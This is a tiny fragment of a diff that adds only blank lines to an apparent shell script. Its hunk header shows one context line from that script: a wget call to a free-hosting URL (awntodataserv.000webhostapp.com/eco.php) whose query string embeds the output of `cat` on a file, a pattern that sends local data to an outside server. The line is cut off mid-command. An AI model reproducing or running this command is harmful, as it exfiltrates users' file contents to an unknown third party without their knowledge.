@@ -21,3 +21,5 @@ wget -O work_inet "https://awntodataserv.000webhostapp.com/eco.php?rdu=`cat $pdi
 
 
 
+
+
